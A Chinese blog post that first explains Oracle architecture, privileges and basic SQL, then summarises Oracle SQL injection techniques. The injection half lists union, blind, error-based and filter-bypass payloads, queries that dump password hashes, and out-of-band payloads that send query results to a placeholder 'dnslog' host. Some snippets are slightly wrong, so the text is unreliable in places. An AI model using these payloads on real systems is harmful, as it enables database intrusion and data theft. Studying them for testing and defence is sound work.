---
title: Oracle 操作语句及注入总结
tags:
  - Oracle
  - SQLi
  - Summary
date: 2020-07-08 10:26:18
---

## 0x01 基础知识

Oracle 是甲骨文公司的一款关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。

### 体系结构

![](/assets/images/move/2020-07-08-10-45-28.png)

Oracle Server 由两个实体组成：

- 实例 Instance：实例是数据库启动时初始化的一组进程和内存结构
  实例 = 后台进程 + 进程所使用的内存(SGA, 系统全局区域)
  - 后台进程：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求。
  - 系统全局区域 SGA：内存共享区域，包含实例配置、数据缓存、操作日志等信息，由后台进程进行共享。

  通常数据库实例会用一个唯一标识来标识，这个标识符便称为 SID（System Identifier）。
- 数据库 Database：数据库则指的是用户存储数据的一些物理文件
  Oracle 数据库除了基本的数据文件，还有控制文件和 Redo 日志。数据库一般位于 `$ORACLE_HOME/oradata/SID`，SID 对应创建数据库时指定的实例 SID，数据文件以 `*.dbf` 的形式存放。

在数据库创建过程中，实例首先被创建，然后才创建数据库。在典型的单实例环境中，实例与数据库的关系是一对一的，一个实例连接一个数据库，实例与数据库也可以是多对一的关系，即不同计算机上的多个实例打开共享磁盘系统上的一个公用数据库。这种多对一关系被称为实际应用群集（RAC, Real Application Clusters，RAC）极大提高了数据库的性能、容错与可伸缩性（可能耗费更多的存储空间）并且是 Oracle Grid 概念的必备部分。

### 数据结构


![](/assets/images/move/2020-07-08-11-23-55.png)

Oracle 关系型数据库管理系统从逻辑上把数据保存在表空间内，在物理上以数据文件的形式存储。表空间可以包含多种类型的内存区段，例如数据区段（Data Segment）、索引区段（Index Segment）等等。区段相应的由一个或多个扩展（extent）组成。

**逻辑结构：** 数据库（Database）-> 表空间（TableSpace）-> 区段（Segment）-> 拓展（Extent）-> 块（Block）

**表空间：**数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库（*.dbf）。

![](/assets/images/move/2020-07-08-11-32-03.png)

- SYSTEM 表空间：包含了数据字典以及（默认的）索引和集群。数据字典包含了一个保存了所有数据库中用户对象的信息的表，用于存储系统表和管理配置等基本信息。
- SYSAUX 表空间：SYSTEM 表的辅助表空间，主要存放一些系统附加信息，用来降低 SYSTEM 表空间的负载。
- TEMP 表空间：临时表空间，主要用途是在数据库进行排序运算、管理索引、访问视图等操作时提供临时的运算空间，运算完后系统自动清理，可减少内存负担。
- UNDOTBS 表空间：用于事务回退的表空间，存放撤销数据。
- USERS 表空间：通常用于存放应用系统所使用的数据库对象，存储我们定义的表和数据。
- EXAMPLE 表空间：存放各实例的相关数据。

### 权限和用户

**权限和角色：**

- DBA: 拥有全部特权，是系统最高权限，只有 DBA 才可以创建数据库结构。
- RESOURCE: 只可以创建实体，能进行基本的 CURD 操作，不可以创建数据库结构。
- CONNECT: 只可以登录Oracle，不可以创建实体，不可以创建数据库结构。
一般oracle数据库安装成功后会创建几个默认用户sys、system、public等

**用户：**

- sys： DBA 角色
- system：DBA 角色，相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行 
- public：代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）


## 0x02 基本语法



Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用 dual，dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。

```sql
select column, group_function(column)
  from table
    [where condition]
      [group by group_by_expression]
        [having group_condition]
          [order by column];
```

执行流程：from -> where -> group by -> having -> select -> order by.

### & MySQL

**与 MySQL 相比：**

- select 必须要指明表名。也可以用 dual 作为虚拟表来对非真实的表进行查询。

- 单引号与双引号：Oracle 的单引号与 MySQL 一致，但是**双引号用于消除系统关键字**。

- Oracle 中空字符串 `''` 就是 null，只有 null，没有空字符；而 MySQL 是区分 null 和 `''` 的。

- 字符拼接：Oracle 使用 `||` 拼接字符串，MySQL 中为或运算。

- Limit：Oracle 中 limit 使用虚表中的 rownum 字段通过 where 条件判断。
  ```sql
  # Oracle -> MySQL
  select * from user where rownum = n -> select * from user limit n, 1
  ```
- 注释符：Oracel 的单行注释符是 `--`，多行注释符是 `/**/`。

### DB Info

**Oracle 的系统表：**

- dba_tables : 系统里所有的表的信息，需要 DBA 权限才能查询
- all_tables : 当前用户有权限的表的信息
- user_tables: 当前用户名下的表的信息
- DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表
- ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表
- USER_ALL_TABLES：某一用户所拥有的对象和表

**获取数据库信息（Oracle: MySQL）：**

- 服务器版本
  ```sql
  Oracle: SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
          SELECT version FROM v$instance;
  MySQL: select version()
  ```
- 操作系统版本
  ```sql
  Oracle: SELECT banner FROM v$version where banner like 'TNS%';
  MySQL: @@version_compile_os
  ```
- 获取主机名和 IP
  ```sql
  SELECT UTL_INADDR.get_host_name FROM dual;
  SELECT host_name FROM v$instance;
  SELECT UTL_INADDR.get_host_name('127.0.0.1') FROM dual;
  SELECT UTL_INADDR.get_host_address FROM dual;
  ```
- DB 文件路径
  ```sql
  SELECT name FROM V$DATAFILE;
  ```
- 当前数据库
  ```sql
  Oracle: SELECT global_name FROM global_name; SELECT name FROM v$database;
          SELECT instance_name FROM v$instance; SELECT SYS.DATABASE_NAME FROM DUAL;
  MySQL: select database();
  ```
- 当前用户权限下所有数据库
  ```sql
  Oracle: SELECT DISTINCT owner, table_name FROM all_tables;
  ```
- 表名
  ```sql
  Oracle: SELECT table_name FROM all_tables;
  MySQL: select table_name from information_schema.tables;
  ```
- 字段名
  ```sql
  Oracle: SELECT column_name FROM all_tab_columns;
  MySQL: SELECT column_name from information_schema.columns;
  ```

### User Info

**用户列表：**

```sql
-- 获取当前数据库用户
SELECT user FROM dual;
-- 列出所有用户
SELECT username FROM all_users ORDER BY username;
-- 列出所有用户
SELECT name FROM sys.user$; --priv;
```

**用户角色：**

```sql
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
SELECT DISTINCT grantee FROM dba_sys_privs;
```

**列出 DBA 用户：**

```sql
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; --priv;
```

**用户权限：**

```sql
-- 获取当前用户权限
SELECT * FROM session_privs;
-- 获取所有用户权限
SELECT * FROM dba_sys_privs; --priv;  
```

**密码哈希:**

```sql
-- 获取所有数据库用户密码
-- astatus 能够在 acct 被锁定的状态下进行反馈
SELECT name, password, astatus FROM sys.user$; --priv; <= 10g
SELECT name, spare4 FROM sys.user$; --priv; 11g
```

### User Op

**创建用户：**

Oracle 内部有两个内置用户：system 和 sys。用户可直接登录到 system 用户以创建其他用户。

```sql
create user username identified by password;
```

**删除用户：**

```sql
drop user username;
```

若用户拥有对象，则不能直接删除，否则将返回一个错误值。指定关键字 cascade, 将删除用户所有对象后再删除用户。

```sql
drop user test cascade;
```

**修改口令：**

```sql
alter user username identified by new_password;
```

**授权角色：**

1. connect role

  - 临时用户，特指不需要建表的用户，通常只赋予他们 connect role

  - 只对其他用户的表有访问权限，包括 select/insert/update 和 delete 等

  - 可以创建表、视图、序列（sequence）、簇（cluster）、同义词（synonym）等



2. resource role

  - 更可靠和正式的数据库用户可以授予 resource role

  - 提供给用户另外的权限以创建他们自己的表、序列、过程(procedure)、触发器(trigger)等



3. dba role：拥有所有的系统权限，包括无限制的空间限额和给其他用户授予各种权限的能力。

```sql
grant connect, resource to username;
```

撤销权限：

```sql
revoke connect, resource from username;
```

**创建/授权/删除角色：**

```sql
-- Create Role
create role role_name;
-- Grant Role
grant select on table_name to role_name;
-- Delete Role
drop role role_name;
```

### Table CRUD

Oracle 只有一个数据库，它给账户开辟数据库空间，称之为表空间(TableSpace)，创建数据库就是开辟账户的表空间。

```sql
-- 创建表空间
create tablespace 表间名 datafile '数据文件名' size 表空间大小
create tablespace data_test datafile '/tmp/data_1.dbf' size 2000M;
-- 创建用户并制定表空间
create user 用户名 identified by 密码 default tablespace 表空间表;
-- 表空间给角色授权
alter user 用户名 quota unlimited on 表空间;
```

**Create:**

```sql
CREATE TABLE table_name (
  column_name1 data_type,
  column_name2 data_type,
  .......)
```

[Oracle DataType](https://docs.oracle.com/cd/B28359_01/server.111/b28318/datatype.htm): [Oracle jdbc datatype](https://www.cnblogs.com/liuyuanyuanGOGO/archive/2013/05/09/3068605.html)


**Update:**

更新表：

```sql
update tablename [alternateName]
  set columnname = newValue where condition;
```

插入数据：

```sql
INSERT INTO table_name VALUES(1, 'admin', 'Admin@123');
```

**Read:**

```sql
select * from table_name;
```

**Delete：**

```sql
-- 可以回滚，不删除空间，大表格数据时性能较差
delete from tablename where condition;
-- 删除表对象，也会快速清除表数据，不能回滚
drop table table_name;
```

## 0x03 SQLi

### union select

Oracle 的数据类型是强匹配的，所以在 Oracle 进行类似 UNION 查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用 null 代替某些无法快速猜测出数据类型的位置，最后查询返回指定的记录时，Oracle 没有 limit 函数，要通过'>=0 <=1'这种形式来指定。

```sql
select password from sqli where rownum>=0 and rownum<=1
select password from (select rownum r, password from sqli) where r>=0 and r<=1 --
```

(1) Order by 判断列数：order by x --

(2) 判断列数后使用 null 代替来注入数据 
```sql
union select null,null,null,null,null,null,null,null,null,null from dual --
```
(3) 获取当前数据库用户信息和数据库信息
```sql
union select null,(SELECT user FROM dual where rownum=1),null from dual --
```

(4) 注入爆库名
```sql
union select null,(select owner from all_tables where rownum=1),null from dual --
```
这里用 rownum 来指定返回结果，如果要匹配字符的数据库需要使用 `<>` (rownum = 1 and owner <> 'MASTER')

(5) 注入爆表名

```sql
union select null,(select table_name from user_tables where rownum = 1),null from dual --
```
(6) 注入爆列
```sql
union select null,(select column_name from user_tab_columns where table_name='SQLI' and rownum=1),null from dual --
```
(7) 常规 Union select 取数据


### Boolen

**布尔盲注：**

```sql
-- subtstr
and (select substr(user, 1, 1) from dual)='O' -- +
-- decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值)
and 1=(select decode(substr(user, 1, 1),'T',(1/1),0) from dual) -- +
and 1=(select decode(substr(user, 1, 1),'T',(1/0),0) from dual) -- 成功则报错
-- instr(源,目标,起始位置,第几个匹配的序号)
and 1=(instr((select user from dual),'TEST')) --
```

**时间盲注：**

```sql
-- decode 匹配成功延时，失败则不延时
select decode(substr(user,1,1),'T',dbms_pipe.receive_message('any', 5),0) from dual;
-- 利用获取大量数据的语句
select count(*) from all_objects
```

### Error Based

- utl_inaddr.get_host_name

在 11g 之前不需要任何权限，在 11g 之后当前的数据库用户必须有网络访问权限。

```sql
select utl_inaddr.get_host_name((select user from dual)) from dual;
```
- ctxsys.drithsx.sn

处理文本的函数，传入参数错误的时会报错返回异常.

```sql
select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
```

- CTXSYS.CTX_REPORT.TOKEN_TYPE

用于处理文本，参数错误返回异常信息。

```sql
select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual;
```

- XMLType

XMLType 是 Oracle 系统定义的数据类型，系统预定义了内部函数去访问 XML 数据.

```sql
select XMLType('<:'||(select user from dual)||'>') from dual;
```

调用的时候必须以 `<:` 开头和 `>` 结尾，即 '<:'||balabala||'>' 或者 chr(60)||balabal||chr(62）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex 后导出，或者使用 replace 函数替换成其他非空字符。

- dbms_xdb_version.checkin

```sql
select dbms_xdb_version.checkin((select user from dual)) from dual;
```

- dbms_xdb_version.makeversioned

```sql
select dbms_xdb_version.makeversioned((select user from dual)) from dual;
```

- dbms_xdb_version.uncheckout

```sql
select dbms_xdb_version.uncheckout((select user from dual)) from dual;
```

- dbms_utility.sqlid_to_sqlhash

```sql
SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
```

- ordsys.ord_dicom.getmappingxpath

```sql
select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
```

- UTL_INADDR.get_host_name

```sql
select UTL_INADDR.get_host_name((select user from dual)) from dual;
```

- UTL_INADDR.get_host_address

```sql
select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual;
```

### OOB

- utl_http.request

```sql
select utl_http.request('dnslog'||(select user from dual)) from dual;
```

- utl_inaddr.get_host_address

DNS 解析带外，把查询结果拼接到域名下，并使用 DNS 记录解析日志，获取查询结果。

```sql
select utl_inaddr.get_host_address((select user from dual)||'dnslog') from dual
```

- SYS.DBMS_LDAP.INIT

在 Oracle 10g 和 11g 里面只需要 public 权限。

```sql
SELECT DBMS_LDAP.INIT(('dnslog', 80) FROM DUAL;
```

- HTTPURITYPE

HTTPURITYPE 根据给定的 URI 创建一个实例

```sql
SELECT HTTPURITYPE((select user from dual)||'dnslog').GETCLOB() FROM DUAL;
```


- Oracle <= 10g

```sql
UTL_INADDR.GET_HOST_ADDRESS
UTL_HTTP.REQUEST
HTTP_URITYPE.GETCLOB
DBMS_LDAP.INIT and UTL_TCP
```

### Bypass


- hextoraw() / rawtohex()

```mysql
SELECT hextoraw(rawtohex('test')) FROM dual
```

- ASCIICHAR()

```mysql
SELECT ASCIISTR('害') from dual -> \5BB3
```

- 空格绕过

`%0a`（换行）、`%0b`（Tab）、`%0c`（制表符）、`/*多行注释*/`、`/*!内联注释*/`、`--%0a`可用于替换空格。


**- 参看 -**

\[1\] [Oracle 注入指北 - Tr0y's blog](https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html)
\[2\] [关于学习 Oracle 注入 - Oslo](https://xz.aliyun.com/t/7897)






